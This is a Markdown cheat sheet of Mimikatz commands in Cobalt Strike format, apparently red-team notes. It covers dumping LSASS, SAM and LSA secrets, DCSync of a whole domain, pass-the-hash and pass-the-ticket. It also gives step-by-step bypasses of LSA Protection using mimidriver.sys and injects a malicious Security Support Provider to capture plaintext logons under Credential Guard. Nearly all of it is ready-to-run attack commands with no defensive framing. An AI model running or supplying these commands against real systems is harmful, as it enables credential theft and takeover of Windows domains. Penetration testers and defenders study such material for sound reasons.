- **NOTE:** The commands are in cobalt strike format! Remove the `mimikatz` prefix if executing from `mimikatz.exe`.
- Dump LSASS credentials stored in memory:
```js
mimikatz privilege::debug
mimikatz token::elevate
mimikatz sekurlsa::logonpasswords
```
- OverPass the Hash:
```js
mimikatz privilege::debug
mimikatz sekurlsa::pth /user:<UserName> /ntlm:<NTLMHash> /domain:<DomainFQDN> /run:powershell
```
- List all available Kerberos tickets in memory:
```js
mimikatz sekurlsa::tickets
```
- Dump local Terminal Services credentials:
```js
mimikatz sekurlsa::tspkg
```
- Dump and save LSASS in a file:
```js
mimikatz sekurlsa::minidump c:\temp\lsass.dmp
```
- List cached MasterKeys:
```js
mimikatz sekurlsa::dpapi
```
- List local Kerberos AES Keys:
```js
mimikatz sekurlsa::ekeys
```
- Dump `SAM` database:
```js
mimikatz lsadump::sam
```
- Dump `SECRETS` database:
```js
mimikatz lsadump::secrets
```
- Inject and dump the domain controler's credentials:
```js
mimikatz privilege::debug
mimikatz token::elevate
mimikatz lsadump::lsa /inject
```
- Dump the domain's credentials without touching DC's LSASS and also remotely:
```js
mimikatz lsadump::dcsync /domain:<DomainFQDN> /all
```
- List and dump local Kerberos credentials:
```js
mimikatz kerberos::list /dump
```
- Pass the Ticket:
```js
mimikatz kerberos::ptt <PathToKirbiFile>
```
- List TS/RDP sessions:
```js
mimikatz ts::sessions
```
- List Vault credentials:
```js
mimikatz vault::list
```

---

- **NOTE:** What if Mimikatz fails to dump credentials because of LSA Protection controls?
- LSA as a protected process (Kernel Land Bypass):
1. Check if LSA runs as a protected process by looking if the variable `RunAsPPL` is set to `0x1`:
```powershell
reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa
```
2. Next upload the `mimidriver.sys` from the official Mimikatz repo to same folder of your `mimikatz.exe`:
3. Now lets import the `mimidriver.sys` to the system:
```js
mimikatz # !+
```
4. Now lets remove the protection flags from `lsass.exe` process:
```js
mimikatz # !processprotect /process:lsass.exe /remove
```
5. Finally run the `logonpasswords` function to dump `lsass`:
```js
mimikatz # sekurlsa::logonpasswords
```

---

- LSA as a protected process (Userland "Fileless" Bypass):
	- [**PPLdump** - Dump the memory of a PPL (Protected Process Light) with a userland exploit](https://github.com/itm4n/PPLdump)
	- [Bypassing LSA protection in Userland - blog](https://blog.scrt.ch/2021/04/22/bypassing-lsa-protection-in-userland/)

---

- LSA is running as a virtualized process (LSAISO) by Credential Guard:
1. Check if a process called `lsaiso.exe` exists on the running processes:
```shell
tasklist | findstr lsaiso
```
- If it does, there isn't a way to dump `lsass`, we will only get encrypted data. 
- But we can still use keyloggers or clipboard dumpers to capture data.
2. Lets inject our own malicious Security Support Provider into memory, for this example I'll use the one Mimikatz provides:
```js
mimikatz # misc::memssp
```
- Now every user session and authentication into this machine will get logged and plaintext credentials will get captured and dumped into `c:\windows\system32\mimilsa.log`.

---

- [**Detailed Mimikatz Guide**](https://adsecurity.org/?page_id=1821)
- [**Poking Around with Two LSASS Protection Options**](https://medium.com/red-teaming-with-a-blue-team-mentality/poking-around-with-2-lsass-protection-options-880590a72b1a)

